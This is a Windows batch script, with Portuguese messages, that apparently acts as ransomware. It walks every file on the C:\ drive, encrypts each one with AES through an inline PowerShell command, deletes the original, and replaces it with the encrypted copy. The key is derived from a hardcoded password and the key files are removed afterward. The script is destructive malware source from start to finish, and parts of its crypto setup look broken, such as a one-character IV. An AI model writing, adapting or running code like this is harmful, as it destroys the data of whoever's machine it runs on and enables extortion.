@echo off

set "senha=3060tkj(GJK%%($*¨(@#LKTG"
set "tamanho_bloco=65536"
set "chave=%TEMP%\chave.txt"
set "iv=%TEMP%\iv.txt"

echo %senha%> %chave%
certutil -encodehex -f %chave% %chave%.hex >nul
set /p hexchave=<%chave%.hex

echo %hexchave:~0,64% > %chave%

set "tempfile=%TEMP%\tempfile"

for /r "C:\" %%f in (*) do (
    if not "%%~nxf"=="criptografado.bat" (
        echo Criptografando "%%~nxf"...
        powershell -command "$key='%hexchave:~0,64%';$iv='0';$input='%%f';$output='%tempfile%';$aes=[System.Security.Cryptography.Aes]::Create();$aes.KeySize=256;$aes.BlockSize=128;$aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;$aes.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($key);$aes.IV=[System.Text.Encoding]::UTF8.GetBytes($iv);$encryptor=$aes.CreateEncryptor();$fsIn=New-Object IO.FileStream($input,'OpenOrCreate','Read');$fsOut=New-Object IO.FileStream($output,'OpenOrCreate','Write');$cryptStream=New-Object Security.Cryptography.CryptoStream($fsOut,$encryptor,'Write');$buf=New-Object byte[] $aes.BlockSize/8;$count=$fsIn.Read($buf,0,$aes.BlockSize/8);while($count -gt 0){$cryptStream.Write($buf,0,$count);$count=$fsIn.Read($buf,0,$aes.BlockSize/8)}$cryptStream.FlushFinalBlock();$cryptStream.Close();$fsIn.Close();$fsOut.Close();"
        del "%%f"
        ren "%tempfile%" "%%~nxf"
    )
)

del %chave% %chave%.hex
echo Todos os arquivos foram criptografados com sucesso!
pause
